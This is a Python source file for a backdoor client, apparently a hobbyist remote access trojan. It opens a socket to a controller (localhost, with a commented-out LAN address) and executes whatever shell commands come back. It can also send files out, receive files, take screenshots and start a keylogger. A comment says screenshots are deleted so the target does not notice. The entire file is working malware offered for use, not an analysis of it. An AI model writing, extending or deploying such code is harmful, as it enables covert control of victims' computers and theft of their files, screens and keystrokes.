import json
import socket
import subprocess
import os
import pyautogui
import keylogger
# #
def reliable_send(data):
    jsondata=json.dumps(data)
    s.send(jsondata.encode())
# #
def reliable_recv():
    data=''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk=s.recv(1024) #reciving the file
    while chunk:
        f.write(chunk) #writing the file
        try:
            chunk = s.recv(1024)
        except socket.timeout as e: #any error
            break
    s.settimeout(None) #we dont want to wait
    f.close() #closing of file

def upload_file(file_name):
    f=open(file_name, 'rb') #reading the file (b-binaryfile)
    s.send(f.read())
#
def screen_shot():
    myScreenshot= pyautogui.screenshot() #inbuilt function
    myScreenshot.save('screen.png') #saving the file

def show_file():
    f = open('processmanager.txt', 'r')
    content = f.readlines()
    print(content)
    f.close()
#
# #
# #
def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'help':
            pass
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ': #this is from first 3 poistion cd+space
            os.chdir(command[3:]) #method id chdir = change directory
        elif command[:6] == 'upload':
            download_file(command[7:]) #after the command whatever be the file name will be the parameter
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:10] == 'screenshot':
            screen_shot()
            upload_file('screen.png') #tto upload the file
            os.remove('screen.png') #remove the ss so that target machine does not know
        elif command[:15] == 'keylogger_start':
            target = keylogger.keylog()

        else: #excution of code
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result=result.decode()
            reliable_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 5555))
#s.connect(('192.168.0.7', 5555))
shell()

# #
